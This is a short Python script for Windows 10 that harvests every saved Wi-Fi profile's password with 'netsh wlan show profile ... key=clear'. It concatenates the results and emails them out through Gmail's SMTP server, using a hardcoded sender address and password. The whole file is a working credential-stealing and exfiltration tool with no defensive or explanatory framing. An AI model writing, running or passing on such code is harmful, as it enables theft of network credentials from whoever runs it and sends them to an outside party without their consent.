#!/usr/bin/env python
'''
COMPATIBLE:
    Windows 10


NOTE:
    1)Popen executes the command you give it and continues program execution
    2)Windows command to get wifi passwords stored on computer
        netsh wlan show profile wifi-name key=clear
'''
import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True).decode()
network_names_list = re.findall("(?:Profile\s*:\s)(.*)(?:\r)", networks)

result = ""
for network_name in network_names_list:
    try:
        current_result = subprocess.check_output(["netsh", "wlan", "show", "profile", network_name, "key=clear"], shell=True)
    except: #network_name has a special character
        network_name = re.sub("[^0-9a-zA-Z]+", "*", network_name)
        current_result = subprocess.check_output(["netsh", "wlan", "show", "profile", network_name, "key=clear"], shell=True)
    result = str(result) + str(current_result)

send_mail("johndoe699012@gmail.com", "Pass19805", result)